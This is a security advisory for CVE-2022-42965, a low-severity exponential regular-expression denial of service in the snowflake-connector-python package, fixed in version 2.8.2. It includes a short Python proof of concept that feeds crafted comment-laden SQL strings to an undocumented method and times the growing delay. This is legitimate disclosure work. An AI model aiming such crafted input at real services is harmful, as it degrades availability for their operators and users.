---
description: CVE-2022-42965 Low severity. Exponential ReDoS in snowflake-connector-python leads to denial of service
title: snowflake-connector-python ReDoS
date_published: "2022-10-15"
last_updated: "2022-11-20"
xray_id: XRAY-257185
vul_id: CVE-2022-42965
cvss: 3.7
severity: low
discovered_by: Denys Vozniuk
type: vulnerability

---

## Summary

Exponential ReDoS in snowflake-connector-python leads to denial of service

## Component

[snowflake-connector-python](https://pypi.org/project/snowflake-connector-python)

## Affected versions

snowflake-connector-python (,2.8.1], Fixed in 2.8.2

## Description

An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the snowflake-connector-python PyPI package, when an attacker is able to supply arbitrary input to the undocumented `get_file_transfer_type` method.

## PoC

```python
import time
from snowflake.connector.cursor import SnowflakeCursor

for i in range(100):
    start_time = time.time()
    sql = '/**/\n' + '\t/*/get\t*/\t/**/\n'*i + '\t*/get\n'
    SnowflakeCursor.get_file_transfer_type(sql)
    print("--- %s seconds ---" % (time.time() - start_time))
```



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

[NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-42965)